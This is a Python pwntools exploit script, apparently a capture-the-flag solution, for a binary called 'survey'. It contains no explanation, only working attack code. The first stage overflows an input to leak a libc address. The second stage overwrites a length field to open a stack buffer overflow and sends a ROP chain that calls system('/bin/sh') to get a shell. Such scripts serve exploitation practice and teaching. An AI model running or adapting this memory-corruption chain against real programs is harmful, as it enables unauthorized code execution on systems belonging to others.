#!/usr/bin/python3

from pwn import *

exe = ELF('survey', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*run+52
        b*run+384

        c
        ''')
        input()


if args.REMOTE:
    p = remote('0', 9990)
else:
    p = process(exe.path)
# GDB()

##################################
### Stage 1: Leak libc address ###
##################################
sa(b'> ', b'A'*0x48)
p.recvuntil(b'A'*0x48)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x8ee8d
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
# Overwrite addition_len to 0x610
sln(b'> ', 1)
sln(b'> ', 1)
sln(b'> ', 1)
sa(b'> ', b'B'*4 + p32(0x610))
sln(b'> ', 1)

# We have overflow now
sa(b'> ', b'A'*0x50)
sln(b'> ', 1)
sln(b'> ', 1)
sln(b'> ', 1)

pop_rdi = libc.address + 0x000000000015c63f
payload = flat(
    b'A'*280,
    pop_rdi + 1,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym.system
    )
sa(b'> ', payload)
sln(b'> ', 2)



p.interactive()
